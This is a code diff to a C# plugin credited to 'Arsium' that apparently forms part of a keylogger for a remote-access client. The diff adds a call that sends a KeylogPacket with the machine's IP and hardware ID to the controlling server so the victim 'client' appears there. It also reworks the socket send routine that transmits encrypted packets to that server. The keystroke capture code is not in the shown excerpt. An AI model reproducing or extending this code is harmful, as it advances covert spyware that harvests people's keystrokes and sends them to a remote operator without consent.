@@ -4,7 +4,6 @@ using PacketLib.Utils;
 using System;
 using System.IO;
 using System.Net.Sockets;
-using System.Windows.Forms;
 
 /* 
 || AUTHOR Arsium ||
@@ -81,6 +80,7 @@ namespace Plugin
             }
             else
             {
+                this.SendPacket(new KeylogPacket("", Launch.baseIp, Launch.HWID));//this to get client on server
                 Receive();
             }
         }
@@ -170,26 +170,26 @@ namespace Plugin
         }
         private int SendData(IPacket data)
         {
-            try
+            byte[] encryptedData = data.SerializePacket(this.key);
+
+            int total = 0;
+            int size = encryptedData.Length;
+            int datalft = size;
+            byte[] header = new byte[5];
+
+            byte[] temp = BitConverter.GetBytes(size);
+
+            header[0] = temp[0];
+            header[1] = temp[1];
+            header[2] = temp[2];
+            header[3] = temp[3];
+            header[4] = (byte)data.packetType;
+
+            lock (socket)
             {
-                byte[] encryptedData = data.SerializePacket(this.key);
-
-                int total = 0;
-                int size = encryptedData.Length;
-                int datalft = size;
-                byte[] header = new byte[5];
-                socket.Poll(-1, SelectMode.SelectWrite);
-
-                byte[] temp = BitConverter.GetBytes(size);
-
-                header[0] = temp[0];
-                header[1] = temp[1];
-                header[2] = temp[2];
-                header[3] = temp[3];
-                header[4] = (byte)data.packetType;
-
-                lock (socket)
+                try
                 {
+                    socket.Poll(-1, SelectMode.SelectWrite);
                     int sent = socket.Send(header);
 
                     if (size > 1000000)
@@ -216,13 +216,15 @@ namespace Plugin
                     }
                     return size;
                 }
-            }
-            catch (Exception)
-            {
-                Connected = false;
-                return 0;
+
+                catch (Exception)
+                {
+                    Connected = false;
+                    return 0;
+                }
             }
         }
+
         private void SendDataCompleted(IAsyncResult ar)
         {
             int length = sendDataAsync.EndInvoke(ar);
